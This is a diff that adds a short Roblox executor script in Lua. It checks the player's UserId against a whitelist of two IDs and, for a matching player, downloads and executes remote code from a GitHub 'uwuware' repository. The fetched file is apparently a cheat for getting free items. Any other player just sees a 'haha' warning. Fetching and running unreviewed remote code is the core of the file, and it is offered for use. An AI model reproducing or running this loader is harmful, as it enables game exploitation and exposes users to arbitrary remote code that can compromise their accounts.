@@ -1,0 +1,7 @@
+getgenv().A1 = {3679363712, 3001347724}
+_G.ui = game.Players.LocalPlayer.UserId
+local a2 = false
+for i,v in ipairs(getgenv().A1) do
+  if _G.ui == v then a2 = true;
+loadstring(game:HttpGet("https://github.com/rrixh/uwuware/raw/refs/heads/main/ugc/freeitems-BuildIt.mobile", true))(); break end; end; 
+if not a2 then warn"haha" end;
